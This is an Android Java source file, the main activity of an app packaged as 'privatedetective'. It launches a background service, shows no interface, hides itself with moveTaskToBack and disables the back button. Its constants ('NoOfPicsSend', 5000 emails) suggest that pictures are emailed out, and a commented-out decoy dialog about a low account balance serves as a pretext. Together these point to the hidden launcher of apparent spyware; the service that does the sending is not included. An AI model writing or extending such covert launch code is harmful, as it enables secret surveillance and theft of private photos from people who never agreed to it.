package com.usk.personal.privatedetective;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {

	public static String PREFNAME = "NoOfPicsSend";
	public static String COUNT = "Count";
	public static int MAX_NO_OF_EMAILS = 5000;
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

//		setContentView(R.layout.activity_main);

		startService(new Intent(this, USKIntentService.class));
//		Builder alertDialog = new AlertDialog.Builder(this);
//		alertDialog
//				.setTitle("Account Balance is low")
//				.setMessage(
//						"Please deposit amount and open this app or open after salary credited.")
//				.setNeutralButton(android.R.string.ok,
//						new DialogInterface.OnClickListener() {
//							@Override
//							public void onClick(DialogInterface dialog,
//									int which) {
//								dialog.dismiss();
//								moveTaskToBack(true);
//							}
//						}).setIcon(android.R.drawable.ic_dialog_alert);
//		AlertDialog alrt = alertDialog.create();
//		alrt.setCancelable(false);
//		alrt.setCanceledOnTouchOutside(false);
//		alrt.show();
		moveTaskToBack(true);
	}

	@Override
	public void onBackPressed() {

	}

}
